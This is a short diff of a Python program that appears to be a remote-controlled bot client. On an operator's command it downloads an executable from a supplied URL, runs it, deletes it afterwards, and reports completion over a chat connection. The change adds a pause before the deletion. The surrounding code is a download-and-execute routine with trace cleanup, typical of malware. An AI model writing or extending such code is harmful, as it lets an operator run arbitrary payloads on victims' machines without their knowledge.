@@ -65,6 +65,7 @@ def main():
                             path = os.path.expanduser("~") + "/Downloads/file.exe"
                             urllib.request.urlretrieve(url, path)
                             os.system('start ' + path)
+                            sleep(5)
                             os.remove(path)
                             chat(s, clientName + " completed the command.")
                         except Exception as e:
